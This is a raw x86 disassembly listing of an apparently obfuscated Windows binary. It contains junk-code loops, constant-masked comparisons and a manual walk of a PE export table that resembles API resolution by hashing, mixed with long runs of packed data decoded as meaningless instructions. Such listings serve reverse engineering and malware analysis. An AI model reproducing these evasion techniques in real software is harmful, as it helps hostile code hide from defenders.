  4102ba:	and    DWORD PTR ds:0x433623,0x0
  4102c4:	xor    ecx,ecx
  4102c6:	xor    ecx,DWORD PTR ds:0x433623
  4102cc:	inc    ecx
  4102cd:	mov    DWORD PTR ds:0x433623,ecx
  4102d3:	cmp    DWORD PTR ds:0x433623,0x22
  4102da:	jne    0x4102e9
  4102e0:	push   DWORD PTR [ebp-0x1c]
  4102e3:	call   DWORD PTR ds:0x412284
  4102e9:	cmp    DWORD PTR ds:0x433623,0x17
  4102f0:	jb     0x4102c4
  4102f6:	add    ecx,DWORD PTR ds:0x4335eb
  4102fc:	mov    DWORD PTR [ebp-0x14],esi
  4102ff:	mov    DWORD PTR [ebp-0x8],esi
  410302:	sub    DWORD PTR ds:0x43362b,0x6d7d
  41030c:	mov    ecx,DWORD PTR [ebp-0x18]
  41030f:	xor    DWORD PTR ds:0x4335e3,0x433547
  410319:	xor    ecx,eax
  41031b:	and    DWORD PTR ds:0x433633,0x0
  410325:	mov    eax,ds:0x433633
  41032a:	inc    eax
  41032b:	mov    ds:0x433633,eax
  410330:	cmp    DWORD PTR ds:0x433633,0xd
  410337:	jne    0x410348
  41033d:	push   0x8573
  410342:	call   DWORD PTR ds:0x4120dc
  410348:	cmp    DWORD PTR ds:0x433633,0xc
  41034f:	jne    0x410360
  410355:	mov    eax,ds:0x433633
  41035a:	inc    eax
  41035b:	mov    ds:0x433633,eax
  410360:	cmp    DWORD PTR ds:0x433633,0x18
  410367:	jb     0x410325
  41036d:	xor    eax,0x75f4
  410372:	xor    edi,edi
  410374:	mov    eax,ds:0x4335e3
  410379:	sbb    eax,DWORD PTR ds:0x433663
  41037f:	mov    ds:0x4335e3,eax
  410384:	add    ecx,ebx
  410386:	movzx  eax,BYTE PTR ds:0x4335ab
  41038d:	mov    DWORD PTR [ebp-0x20],ecx
  410390:	mov    eax,DWORD PTR [ebp-0x20]
  410393:	mov    DWORD PTR ds:0x433567,0x63b9
  41039d:	je     0x410967
  4103a3:	and    DWORD PTR ds:0x433547,0x0
  4103ad:	jmp    0x4103c0
  4103b2:	xor    eax,eax
  4103b4:	xor    eax,DWORD PTR ds:0x433547
  4103ba:	inc    eax
  4103bb:	mov    ds:0x433547,eax
  4103c0:	cmp    DWORD PTR ds:0x433547,0x14
  4103c7:	jae    0x410465
  4103cd:	cmp    DWORD PTR ds:0x433547,0xd
  4103d4:	jne    0x4103e6
  4103da:	push   DWORD PTR [ebp-0x20]
  4103dd:	push   DWORD PTR [ebp-0x18]
  4103e0:	call   DWORD PTR ds:0x412288
  4103e6:	cmp    DWORD PTR ds:0x433547,0xc
  4103ed:	jne    0x4103fe
  4103f3:	mov    eax,ds:0x433547
  4103f8:	inc    eax
  4103f9:	mov    ds:0x433547,eax
  4103fe:	jmp    0x4103b2
  410403:	mov    DWORD PTR ds:0x433657,0x1e
  41040d:	cmp    DWORD PTR ds:0x433657,0x0
  410414:	je     0x410465
  41041a:	cmp    DWORD PTR ds:0x433657,0x4
  410421:	jne    0x41043a
  410427:	push   DWORD PTR [ebp-0xc]
  41042a:	push   0x433874
  41042f:	push   0x43355f
  410434:	call   DWORD PTR ds:0x4121c4
  41043a:	cmp    DWORD PTR ds:0x433657,0x5
  410441:	jne    0x410452
  410447:	mov    eax,ds:0x433657
  41044c:	dec    eax
  41044d:	mov    ds:0x433657,eax
  410452:	xor    eax,eax
  410454:	add    eax,DWORD PTR ds:0x433657
  41045a:	dec    eax
  41045b:	mov    ds:0x433657,eax
  410460:	jmp    0x41040d
  410465:	mov    eax,DWORD PTR [ebp-0x4]
  410468:	xor    eax,0x7510853
  41046d:	sub    DWORD PTR ds:0x433657,0xdb8
  410477:	add    eax,ebx
  410479:	mov    DWORD PTR ds:0x4335a7,0x3f77
  410483:	cmp    edi,eax
  410485:	jne    0x4107cf
  41048b:	sub    DWORD PTR ds:0x43359b,0x29bd
  410495:	push   DWORD PTR [ebp+0x8]
  410498:	call   0x40f639
  41049d:	inc    ecx
  41049e:	mov    DWORD PTR [ebp-0x20],eax
  4104a1:	adc    DWORD PTR ds:0x4335e3,0xc37
  4104ab:	jmp    0x4105e6
  4104b0:	sbb    eax,0xb1fd9f18
  4104b5:	jge    0x410514
  4104b7:	fsub   DWORD PTR [edx+0xa]
  4104ba:	adc    ecx,ebx
  4104bc:	jg     0x410522
  4104be:	jecxz  0x4104a5
  4104c0:	cdq    
  4104c1:	mov    esi,0x7f127c7c
  4104c6:	jl     0x410544
  4104c8:	out    dx,eax
  4104c9:	loope  0x4104e5
  4104cb:	dec    ecx
  4104cc:	repz cmp eax,0x8347bec8
  4104d2:	sbb    eax,0x8138177c
  4104d7:	test   al,0x9e
  4104d9:	add    BYTE PTR [eax+ecx*8-0x66],al
  4104dd:	imul   edi,eax,0x47
  4104e0:	sbb    al,0x89
  4104e2:	imul   ebp,DWORD PTR [edx-0x4bf11c90],0x4337f4c4
  4104ec:	push   0xc9db02e9
  4104f1:	sti    
  4104f2:	cmp    edi,ebp
  4104f4:	jo     0x410552
  4104f6:	ins    DWORD PTR es:[edi],dx
  4104f7:	outs   dx,BYTE PTR ds:[esi]
  4104f8:	hlt    
  4104f9:	iret   
  4104fa:	ins    DWORD PTR es:[edi],dx
  4104fb:	pop    ss
  4104fc:	stc    
  4104fd:	mov    eax,0xf1da1738
  410502:	mov    ecx,0x1ad46a2
  410507:	adc    DWORD PTR [esi],edi
  410509:	or     edx,eax
  41050b:	stc    
  41050c:	test   BYTE PTR ds:0x744758df,bh
  410512:	jmp    0x4104ae
  410514:	mov    dl,BYTE PTR [ecx-0x36afedb8]
  41051a:	rcl    BYTE PTR [edi+0x4a40c30b],0xd9
  410521:	cli    
  410522:	fwait
  410523:	inc    edx
  410524:	pop    ebx
  410525:	loope  0x4104f6
  410527:	sbb    eax,0x2605d564
  41052c:	inc    ecx
  41052e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41052f:	enter  0x43cb,0x2
  410533:	clc    
  410534:	mov    bl,0xf4
  410536:	and    DWORD PTR [ecx+edx*8],edx
  410539:	mov    esp,0x8e1d18d0
  41053e:	push   0xffffffe5
  410540:	div    ch
  410542:	das    
  410543:	sbb    BYTE PTR [ecx],al
  410545:	int3   
  410546:	jmp    0x41052d
  410548:	pop    edx
  410549:	fisttp WORD PTR [ebx+0x2f23fe31]
  41054f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410550:	jo     0x410512
  410552:	push   es
  410553:	pop    eax
  410554:	sub    ah,BYTE PTR [edi]
  410556:	jb     0x4104e9
  410558:	cld    
  410559:	pop    ebx
  41055a:	dec    bl
  41055c:	xor    DWORD PTR [edx],esp
  41055e:	push   0xd7486570
  410563:	mov    eax,ds:0xbdc59a2f
  410568:	mov    ?,WORD PTR ds:0xa735d327
  41056e:	stos   DWORD PTR es:[edi],eax
  41056f:	jecxz  0x410547
  410571:	jmp    0x410596
  410573:	imul   ecx,DWORD PTR [edx+eax*2-0x1b2120e0],0xf2299917
  41057e:	xchg   esi,eax
  41057f:	xchg   esi,eax
  410580:	add    eax,0x60177ec0
  410585:	aam    0x51
  410587:	je     0x410517
  410589:	mov    bl,BYTE PTR [esi-0x77896961]
  41058f:	xchg   ebx,eax
  410590:	mov    db1,ecx
  410593:	or     al,BYTE PTR [edi-0x15]
  410596:	js     0x4105de
  410598:	fidiv  WORD PTR cs:[edx-0x2dcde521]
  41059f:	cmp    DWORD PTR [eax],ebp
  4105a1:	sub    ch,cl
  4105a3:	inc    eax
  4105a4:	push   edx
  4105a5:	mov    edi,0xff8a34dd
  4105aa:	push   ecx
  4105ab:	push   ecx
  4105ad:	shr    BYTE PTR [edi+0x1da1f0de],1
  4105b3:	push   es
  4105b4:	bound  ebp,QWORD PTR [eax+0x15e1975d]
  4105ba:	ret    
  4105bb:	pop    eax
  4105bc:	push   0x51cd2481
  4105c1:	mov    WORD PTR [esi],ds
  4105c3:	dec    ecx
  4105c4:	jmp    0x35c5:0x5835cd0f
  4105cb:	outs   dx,DWORD PTR ds:[esi]
  4105cc:	xchg   esp,eax
  4105cd:	test   esp,ebp
  4105cf:	pop    ebp
  4105d0:	out    0xea,al
  4105d2:	adc    edx,DWORD PTR [ebp+0x5e24ce75]
  4105d8:	add    ah,bl
  4105da:	psadbw mm4,mm4
  4105dd:	cld    
  4105de:	jmp    0xb16d:0xea1be824
  4105e5:	cmp    al,0x8b
  4105e7:	inc    ebp
  4105e8:	cld    
  4105e9:	sbb    DWORD PTR ds:0x4335d7,0x55ce
  4105f3:	mov    ecx,DWORD PTR [ebp-0x20]
  4105f6:	adc    DWORD PTR ds:0x43354f,ebx
  4105fc:	mov    esi,0x7510853
  410601:	xor    eax,esi
  410603:	dec    DWORD PTR ds:0x43362f
  410609:	add    eax,ebx
  41060b:	cmp    ecx,eax
  41060d:	je     0x41094b
  410613:	add    DWORD PTR ds:0x43362f,0x3520
  41061d:	push   DWORD PTR [ebp-0x20]
  410620:	push   DWORD PTR [ebp+0x8]
  410623:	call   0x405227
  410628:	mov    DWORD PTR [ebp-0x14],eax
  41062b:	adc    eax,ecx
  41062d:	mov    eax,DWORD PTR [ebp-0x4]
  410630:	and    DWORD PTR ds:0x4335df,edi
  410636:	jmp    0x410771
  41063b:	pop    ss
  41063c:	imul   ecx,DWORD PTR ds:0x7d706d64,0xb02edf69
  410646:	loope  0x4105e6
  410648:	jbe    0x41065f
  41064a:	js     0x41060b
  41064c:	mov    ecx,0x7f127c7c
  410651:	jl     0x4106cf
  410653:	dec    ecx
  410654:	lahf   
  410655:	retf   
  410656:	int3   
  410657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410658:	fldcw  WORD PTR [ecx]
  41065a:	mov    cl,0x6
  41065c:	lahf   
  41065d:	cld    
  41065e:	xor    cl,al
  410660:	jl     0x41062f
  410662:	cdq    
  410663:	and    eax,0x660d0fc2
  410668:	lock or DWORD PTR [edi+0x2d8c7497],ebx
  41066f:	jecxz  0x410615
  410671:	int3   
  410672:	inc    esi
  410673:	push   esp
  410674:	stos   DWORD PTR es:[edi],eax
  410675:	or     ecx,DWORD PTR [ebx]
  410677:	cmp    al,0x96
  410679:	ins    DWORD PTR es:[edi],dx
  41067a:	aaa    
  41067b:	sbb    eax,0xd54877e2
  410680:	adc    ch,al
  410682:	or     ch,BYTE PTR [esi]
  410684:	jmp    0x79cb22d9
  410689:	jns    0x4106e7
  41068b:	adc    DWORD PTR [esi-0x33b081c9],ecx
  410691:	iret   
  410692:	repz cmp bl,BYTE PTR [edi+0x4ebbd926]
  410699:	leave  
  41069a:	xor    eax,0xa78b237b
  41069f:	pop    esp
  4106a0:	pop    eax
  4106a1:	addr16 cli 
  4106a3:	imul   eax,DWORD PTR [edi+0x1bd0edbf],0xd656996f
  4106ad:	pop    ecx
  4106ae:	jns    0x4106b2
  4106b0:	scas   eax,DWORD PTR es:[edi]
  4106b1:	push   es
  4106b2:	test   edi,esp
  4106b4:	or     eax,0xce40e692
  4106b9:	ret    
  4106ba:	jmp    0xfd88648f
  4106bf:	(bad)  
  4106c0:	arpl   WORD PTR [esi+0x73e0fc3f],sp
  4106c6:	das    
  4106c7:	push   ecx
  4106c8:	pop    ss
  4106c9:	adc    al,0x25
  4106cb:	mov    dl,0x20
  4106cd:	jb     0x410701
  4106cf:	daa    
  4106d0:	mov    ebx,0x42476ccb
  4106d5:	sub    al,0xa7
  4106d7:	ret    
  4106d8:	or     al,0x7d
  4106da:	ss test eax,0x94605795
  4106e0:	loope  0x41066a
  4106e2:	popf   
  4106e3:	enter  0x63fa,0xb6
  4106e7:	sti    
  4106e8:	cmp    BYTE PTR [edx],ch
  4106ea:	jmp    0xeadf0c23
  4106ef:	push   ss
  4106f0:	or     eax,0x340a0af0
  4106f5:	mov    BYTE PTR [edx],ch
  4106f7:	out    0x7a,eax
  4106f9:	add    bh,BYTE PTR [esi+0x4c900baa]
  4106ff:	scas   al,BYTE PTR es:[edi]
  410700:	mov    ebp,0xca49c9a9
  410705:	xor    al,0xf4
  410707:	arpl   WORD PTR [edx+0xb],si
  41070a:	cmp    DWORD PTR [ecx-0x6],esp
  41070d:	lea    ebp,[ebx]
  41070f:	push   es
  410710:	push   cs
  410711:	inc    eax
  410712:	ret    0x5919
  410715:	out    0x59,eax
  410717:	push   ecx
  410718:	sub    al,0xdf
  41071a:	sub    ebx,DWORD PTR [ebx+0x21]
  41071d:	sbb    ah,BYTE PTR [ebp-0x5d]
  410720:	cs call 0xe43ad5c2
  410726:	xchg   esi,eax
  410727:	call   0x4ddea2b9
  41072c:	mov    al,0x5c
  41072e:	fbstp  TBYTE PTR [esi]
  410730:	dec    edx
  410731:	xchg   edi,edx
  410733:	and    eax,0x7883dc37
  410738:	mov    edi,0xc7a2906b
  41073d:	int    0xd4
  41073f:	call   0x247560b7
  410744:	mov    eax,0xc24362bd
  410749:	aad    0x81
  41074b:	mov    edi,0xbe2439d0
  410750:	xchg   edx,eax
  410751:	stc    
  410752:	mov    edi,0x385a8694
  410757:	stos   BYTE PTR es:[edi],al
  410758:	jecxz  0x41079c
  41075a:	test   BYTE PTR [edi+0x43],0xf8
  41075e:	(bad)  
  41075f:	cmc    
  410760:	aam    0x8
  410762:	sti    
  410763:	jmp    0xd5440efb
  410768:	in     eax,dx
  410769:	push   cs
  41076a:	pusha  
  41076b:	xor    DWORD PTR [esp+ebp*1-0x37],ebp
  41076f:	dec    ebx
  410770:	xor    eax,0x81ec4d8b
  410775:	add    eax,0x433567
  41077a:	mov    DWORD PTR [ecx],edi
  41077c:	add    BYTE PTR [eax],al
  41077e:	xor    eax,esi
  410780:	sbb    DWORD PTR ds:0x433563,0x43354f
  41078a:	add    eax,ebx
  41078c:	cmp    ecx,eax
  41078e:	je     0x41094b
  410794:	mov    eax,DWORD PTR [ebp-0x14]
  410797:	xor    DWORD PTR ds:0x4335a3,edi
  41079d:	mov    eax,DWORD PTR [eax+0x18]
  4107a0:	sub    ecx,DWORD PTR ds:0x433663
  4107a6:	mov    DWORD PTR [ebp-0x20],eax
  4107a9:	mov    eax,DWORD PTR [ebp-0x14]
  4107ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4107af:	add    ecx,DWORD PTR [eax+0x20]
  4107b2:	mov    DWORD PTR [ebp-0x28],ecx
  4107b5:	mov    eax,DWORD PTR [ebp-0x14]
  4107b8:	mov    ecx,DWORD PTR [ebp+0x8]
  4107bb:	add    ecx,DWORD PTR [eax+0x24]
  4107be:	mov    DWORD PTR [ebp-0x2c],ecx
  4107c1:	mov    eax,DWORD PTR [ebp-0x14]
  4107c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4107c7:	add    ecx,DWORD PTR [eax+0x1c]
  4107ca:	xor    esi,esi
  4107cc:	mov    DWORD PTR [ebp-0x14],ecx
  4107cf:	mov    eax,DWORD PTR [ebp-0x28]
  4107d2:	jmp    0x41090d
  4107d7:	push   ebp
  4107d8:	xchg   esi,eax
  4107d9:	ins    BYTE PTR es:[edi],dx
  4107da:	stos   DWORD PTR es:[edi],eax
  4107db:	jae    0x41085a
  4107dd:	push   ebp
  4107de:	jbe    0x4107cf
  4107e0:	mov    ds:0x5a4eac5a,eax
  4107e5:	mov    cl,0xde
  4107e7:	pop    ebp
  4107e8:	mov    eax,0x7f127c7c
  4107ed:	jl     0x41086b
  4107ef:	pop    es
  4107f0:	xchg   BYTE PTR [ecx+0x4d646a],dh
  4107f6:	dec    edx
  4107f7:	(bad)  
  4107f8:	jmp    0x410841
  4107fa:	jnp    0x410799
  4107fc:	daa    
  4107fd:	ficom  DWORD PTR [ebx]
  4107ff:	aad    0x74
  410801:	mov    eax,esp
  410803:	ins    BYTE PTR es:[edi],dx
  410804:	pop    ebp
  410805:	scas   eax,DWORD PTR es:[edi]
  410806:	aam    0x5b
  410808:	jae    0x4107cf
  41080a:	loope  0x41081f
  41080c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41080d:	pop    esi
  41080e:	pop    ss
  41080f:	in     al,dx
  410810:	shl    BYTE PTR [ebx-0x11],1
  410813:	jle    0x410886
  410815:	stos   BYTE PTR es:[edi],al
  410816:	mov    ecx,0x49a1771d
  41081b:	cli    
  41081c:	daa    
  41081d:	jbe    0x4107ba
  41081f:	vhaddps ymm6,ymm1,YMMWORD PTR [ecx+ebx*2-0x238684d3]
  410828:	aad    0x3a
  41082a:	inc    ebp
  41082b:	ret    0x68d9
  41082e:	mov    ds:0xb1a15a25,al
  410833:	into   
  410834:	imul   esi,DWORD PTR ds:0x6aca7d3d,0xffffffa1
  41083b:	fld    TBYTE PTR [esi-0x32]
  41083e:	xor    BYTE PTR [ecx+0x48],0xd0
  410842:	mov    esi,0x4c321ca8
  410847:	stos   DWORD PTR es:[edi],eax
  410848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410849:	repnz cmp DWORD PTR [esi],eax
  41084c:	imul   esi,DWORD PTR [edx-0x16],0x44
  410850:	cmp    eax,0x295b21ac
  410855:	mov    bl,0x95
  410857:	jmp    0x410886
  410859:	data16 or ah,dl
  41085c:	bound  eax,QWORD PTR [esi]
  41085e:	xor    BYTE PTR [edx],ch
  410860:	stos   DWORD PTR es:[edi],eax
  410861:	xor    DWORD PTR [esi+esi*8-0x449d6b0f],edi
  410868:	mov    ebx,0xa47a4e51
  41086d:	mov    ds:0x320ede34,eax
  410872:	xchg   edx,eax
  410873:	stos   DWORD PTR es:[edi],eax
  410874:	jne    0x410858
  410876:	sub    ah,ah
  410878:	and    DWORD PTR [esp+eiz*2],ecx
  41087b:	jp     0x4108af
  41087d:	nop
  41087e:	fisttp DWORD PTR [ebx]
  410880:	mov    bh,0xe9
  410882:	push   ebx
  410883:	sbb    bl,bh
  410885:	enter  0xa529,0x7a
  410889:	push   esi
  41088a:	add    edx,DWORD PTR [ebp+0x78]
  41088d:	lods   eax,DWORD PTR ds:[esi]
  41088e:	xchg   edx,eax
  41088f:	cmp    al,0x6
  410891:	mov    esp,0x77c62a98
  410896:	xchg   BYTE PTR [edi],al
  410898:	xlat   BYTE PTR ds:[ebx]
  410899:	repnz fadd DWORD PTR [edi-0x6f]
  41089d:	mov    esi,0xaa3f8062
  4108a2:	fiadd  DWORD PTR [ebx]
  4108a4:	out    dx,al
  4108a5:	(bad)  
  4108a6:	js     0x410841
  4108a8:	popa   
  4108a9:	mov    bh,0x92
  4108ab:	push   eax
  4108ac:	lea    edi,[ecx-0x7b]
  4108af:	pop    ecx
  4108b0:	popa   
  4108b1:	outs   dx,BYTE PTR ds:[esi]
  4108b2:	jmp    0x410893
  4108b4:	outs   dx,BYTE PTR ds:[esi]
  4108b5:	mov    eax,0xffe0c680
  4108ba:	pop    ebp
  4108bb:	(bad)  
  4108bc:	call   0x59fa3783
  4108c1:	sbb    ecx,DWORD PTR [ecx+0x566e014e]
  4108c7:	fst    st(2)
  4108c9:	and    BYTE PTR [ebp+0x58],bl
  4108cc:	jmp    0x41087e
  4108ce:	outs   dx,DWORD PTR ds:[esi]
  4108cf:	mov    bh,0x59
  4108d1:	mov    ds:0xfa26147a,eax
  4108d6:	dec    ebx
  4108d7:	add    eax,DWORD PTR [edi]
  4108d9:	mov    ecx,0xa8e919e1
  4108de:	add    al,0x14
  4108e0:	mov    al,ds:0xbcc4137d
  4108e5:	pop    gs
  4108e7:	jnp    0x41092b
  4108e9:	mov    bh,0xda
  4108eb:	ret    
  4108ec:	jns    0x41092e
  4108ee:	xor    ah,dh
  4108f0:	repnz (bad) 
  4108f2:	bnd jmp 0x4108a6
  4108f5:	data16 aam 0xbd
  4108f8:	div    BYTE PTR [ebx-0x6e5555b6]
  4108fe:	aas    
  4108ff:	add    al,0x55
  410901:	int3   
  410902:	ja     0x410907
  410904:	test   eax,0xc2433f89
  410909:	ja     0x410913
  41090b:	or     DWORD PTR [ecx],0x3084d8b
  410911:	or     al,0xb8
  410913:	lea    eax,[ebp-0x8]
  410916:	mov    DWORD PTR [ebp-0x30],ecx
  410919:	push   eax
  41091a:	push   DWORD PTR [ebp-0x30]
  41091d:	push   DWORD PTR [ebp+0xc]
  410920:	call   0x4040e1
  410925:	mov    eax,DWORD PTR [ebp-0x4]
  410928:	mov    ecx,DWORD PTR [ebp-0x8]
  41092b:	xor    eax,0x7510853
  410930:	add    eax,ebx
  410932:	cmp    ecx,eax
  410934:	jne    0x410957
  41093a:	mov    eax,DWORD PTR [ebp-0x20]
  41093d:	inc    edi
  41093e:	cmp    edi,eax
  410940:	jb     0x4103a3
  410946:	jmp    0x410967
  41094b:	mov    eax,DWORD PTR [ebp-0x4]
  41094e:	xor    eax,esi
  410950:	add    eax,ebx
  410952:	jmp    0x41148d
  410957:	mov    eax,DWORD PTR [ebp-0x2c]
  41095a:	movzx  eax,WORD PTR [eax+edi*2]
  41095e:	mov    ecx,DWORD PTR [ebp-0x14]
  410961:	mov    eax,DWORD PTR [ecx+eax*4]
  410964:	mov    DWORD PTR [ebp+0xc],eax
  410967:	mov    eax,DWORD PTR [ebp-0x4]
  41096a:	mov    ecx,DWORD PTR [ebp-0x8]
  41096d:	xor    eax,0x7510853
  410972:	add    eax,ebx
  410974:	cmp    ecx,eax
  410976:	jne    0x410989
  41097c:	mov    eax,DWORD PTR [ebp-0x4]
  41097f:	xor    eax,0x7510853
  410984:	jmp    0x410950
  410989:	mov    eax,DWORD PTR [ebp+0xc]
  41098c:	jmp    0x410ac7
  410991:	inc    ebx
  410992:	fs dec edi
  410994:	fwait
  410995:	imul   esi,DWORD PTR [ebx-0x6cde9b8d],0x78
  41099c:	or     ch,dl
  41099e:	aam    0x1b
  4109a0:	fnsave [ebx-0x45]
  4109a3:	jl     0x410a21
  4109a5:	adc    bh,BYTE PTR [edi+0x7c]
  4109a8:	jl     0x4109d5
  4109aa:	mov    ebp,0xa357a1cb
  4109af:	push   0x30a24f6c
  4109b4:	bound  edi,QWORD PTR [ebp+0x20af0013]
  4109ba:	sub    edi,ebp
  4109bc:	mov    ds,WORD PTR [ecx+0x73]
  4109bf:	rcl    edx,cl
  4109c1:	mov    dh,BYTE PTR [ecx]
  4109c3:	dec    edx
  4109c4:	cmp    ebp,ebx
  4109c6:	inc    eax
  4109c7:	adc    eax,ebp
  4109c9:	scas   eax,DWORD PTR es:[edi]
  4109ca:	add    al,0x2d
  4109cc:	add    eax,0x9e2420ff
  4109d1:	arpl   WORD PTR [esi],dx
  4109d3:	popf   
  4109d4:	cmp    DWORD PTR [eax+0x3c791ae],ebx
  4109da:	pushf  
  4109db:	xchg   edx,eax
  4109dc:	or     eax,DWORD PTR [edx+0x13ad2bf]
  4109e2:	lods   eax,DWORD PTR ds:[esi]
  4109e3:	jg     0x410a37
  4109e5:	fidivr DWORD PTR [ebx]
  4109e7:	lea    edx,[ebp-0x18]
  4109ea:	aaa    
  4109eb:	mov    ch,0xe5
  4109ed:	sbb    eax,0xbee83724
  4109f2:	jo     0x410a17
  4109f4:	adc    ah,BYTE PTR [esi-0x3c]
  4109f7:	pop    es
  4109f8:	and    al,0xa9
  4109fa:	(bad)  
  4109fb:	pop    esp
  4109fc:	(bad)  
  4109fd:	xor    eax,0x44b6b92
  410a02:	addr16 sub al,0x4f
  410a05:	ret    0xadfb
  410a08:	fadd   DWORD PTR [ecx]
  410a0a:	cmp    eax,0x110c13fa
  410a0f:	(bad)  
  410a10:	ds pop es
  410a12:	or     edi,ebx
  410a14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a15:	push   0x19
  410a17:	(bad)  
  410a18:	stc    
  410a19:	nop
  410a1a:	inc    edx
  410a1b:	adc    eax,esp
  410a1d:	add    dl,BYTE PTR [esi+0x4b9eb4b1]
  410a23:	cld    
  410a24:	(bad)  
  410a25:	js     0x410a46
  410a27:	sub    BYTE PTR [ebx],0x31
  410a2a:	loope  0x410a0e
  410a2c:	push   0xffffffc1
  410a2e:	(bad)  
  410a2f:	out    dx,eax
  410a30:	das    
  410a31:	test   dl,0xd9
  410a34:	or     eax,0xb04e638f
  410a39:	repz jle 0x4109c5
  410a3c:	hlt    
  410a3d:	retf   0xc7ba
  410a40:	sbb    esi,eax
  410a42:	dec    esi
  410a43:	xlat   BYTE PTR ds:[ebx]
  410a44:	mov    WORD PTR [esp+ebx*2-0x73],ds
  410a48:	jp     0x410a26
  410a4a:	push   ecx
  410a4b:	mov    WORD PTR [eax],?
  410a4d:	xor    BYTE PTR [ecx-0x38767787],0xea
  410a54:	je     0x410a6a
  410a56:	or     dh,bl
  410a58:	mov    edx,0x8683ef87
  410a5d:	bound  ebp,QWORD PTR [ecx+0x6964211e]
  410a63:	sbb    al,0x55
  410a65:	xor    al,0x75
  410a67:	or     cl,BYTE PTR [edi+0x47]
  410a6a:	xchg   edx,eax
  410a6b:	stos   BYTE PTR es:[edi],al
  410a6c:	mov    ds:0xb3c46ea,al
  410a71:	push   esp
  410a72:	mov    esp,0x9922f34b
  410a77:	and    eax,0x5e
  410a7a:	sbb    al,0xd6
  410a7c:	jp     0x410a9b
  410a7e:	push   ecx
  410a7f:	push   ebp
  410a80:	jp     0x410ab0
  410a82:	push   esi
  410a83:	push   ebp
  410a84:	shl    bl,0xd1
  410a87:	inc    ecx
  410a88:	push   ecx
  410a89:	inc    edi
  410a8a:	adc    edx,DWORD PTR [eax+0x28]
  410a8d:	das    
  410a8e:	push   ecx
  410a8f:	jle    0x410a7e
  410a91:	mov    edx,ecx
  410a93:	enter  0x2053,0xcc
  410a97:	pop    edx
  410a98:	sub    DWORD PTR [ebx+0x25971df1],0xcd03b363
  410aa2:	lock (bad) 
  410aa5:	xlat   BYTE PTR ds:[ebx]
  410aa6:	pushf  
  410aa7:	inc    edx
  410aa8:	and    DWORD PTR [edi+0x62b5a45e],esp
  410aae:	inc    edx
  410aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ab0:	pop    edi
  410ab1:	push   ebx
  410ab2:	xor    eax,0xc2af9231
  410ab7:	sub    eax,0x8439a606
  410abc:	pop    eax
  410abd:	fdivr  QWORD PTR [ecx+0x69]
  410ac0:	retf   
  410ac1:	cmp    eax,0x5cb7a7b1
  410ac6:	loop   0x410acb
  410ac8:	inc    ebp
  410ac9:	or     BYTE PTR [ecx+0x458bf045],cl
  410acf:	in     al,0x85
  410ad1:	ror    BYTE PTR [edi],0x84
  410ad4:	mov    dh,0x5
  410ad6:	add    BYTE PTR [eax],al
  410ad8:	mov    DWORD PTR [ebp-0x24],esi
  410adb:	push   0xb
  410add:	pop    ecx
  410ade:	push   0x5
  410ae0:	jmp    0x410c1b
  410ae5:	jbe    0x410ad6
  410ae7:	inc    edi
  410ae8:	xchg   DWORD PTR [ecx-0x49],eax
  410aeb:	jbe    0x410ad6
  410aed:	and    al,0x2e
  410aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af0:	fadd   st(0),st
  410af2:	(bad)  
  410af3:	stc    
  410af4:	xor    DWORD PTR [ecx],edx
  410af6:	inc    ebp
  410af7:	jl     0x410b75
  410af9:	adc    bh,BYTE PTR [edi+0x7c]
  410afc:	jl     0x410b16
  410afe:	leave  
  410aff:	sbb    BYTE PTR [edi+0x63],bl
  410b02:	mov    ds:0xa54ce3c2,eax
  410b07:	xchg   edi,eax
  410b08:	cmp    ch,bh
  410b0a:	push   ss
  410b0b:	dec    ebx
  410b0c:	cli    
  410b0d:	in     eax,dx
  410b0e:	pop    ebx
  410b0f:	cmc    
  410b10:	pushf  
  410b11:	bound  ebp,QWORD PTR [edx]
  410b13:	add    esi,DWORD PTR [edi+0x4a]
  410b16:	call   0x5e5d558
  410b1b:	jle    0x410b16
  410b1d:	std    
  410b1e:	call   0xe113b9a8
  410b23:	push   ebp
  410b24:	mov    esp,0x4e4547d8
  410b29:	out    dx,al
  410b2a:	or     BYTE PTR [ebx+0x688cfeac],ah
  410b30:	adc    bl,BYTE PTR ds:0xf5a9ebcb
  410b36:	xchg   DWORD PTR [eax+0x2c03a2a3],ebx
  410b3c:	sub    ebx,ecx
  410b3e:	ja     0x410b86
  410b40:	dec    ecx
  410b41:	xchg   DWORD PTR [edx],esi
  410b43:	or     eax,0x86e7054a
  410b48:	(bad)  
  410b49:	lods   eax,DWORD PTR ds:[esi]
  410b4a:	or     esi,edi
  410b4c:	(bad)  
  410b4e:	fld    DWORD PTR [ebx-0xe]
  410b51:	ss pusha 
  410b53:	(bad)  
  410b54:	call   0x5ee8:0x5ce11834
  410b5b:	push   esi
  410b5c:	pop    ds
  410b5d:	xchg   edx,eax
  410b5e:	stos   DWORD PTR es:[edi],eax
  410b5f:	adc    BYTE PTR [esp+edi*2-0x3f],0x33
  410b64:	shl    ch,0xf7
  410b67:	jno    0x410b57
  410b69:	pop    ds
  410b6a:	les    esp,FWORD PTR [ebx]
  410b6c:	out    dx,al
  410b6d:	mov    esp,0x4f56ff9c
  410b72:	mov    ah,0x4b
  410b74:	lods   eax,DWORD PTR ds:[esi]
  410b75:	sub    al,0xbf
  410b77:	adc    eax,0x2263bf23
  410b7c:	push   cs
  410b7d:	jp     0x410b2f
  410b7f:	retf   
  410b80:	dec    ecx
  410b81:	xor    ecx,DWORD PTR [edi]
  410b83:	lea    esi,[ecx+0x1f]
  410b86:	push   ecx
  410b87:	or     DWORD PTR [ebx+0xb1da2c7],edi
  410b8d:	test   DWORD PTR [edx+0x70],eax
  410b90:	inc    edi
  410b91:	xchg   edi,eax
  410b92:	push   ebx
  410b93:	mov    ebx,0x9d565922
  410b98:	or     eax,0xc65c0255
  410b9d:	xchg   edi,eax
  410b9e:	jmp    0x64cc:0x84e644b5
  410ba5:	ss dec ebx
  410ba7:	outs   dx,DWORD PTR ds:[esi]
  410ba8:	mov    al,ds:0x725a2e04
  410bad:	cmp    edi,DWORD PTR [ebx-0x1]
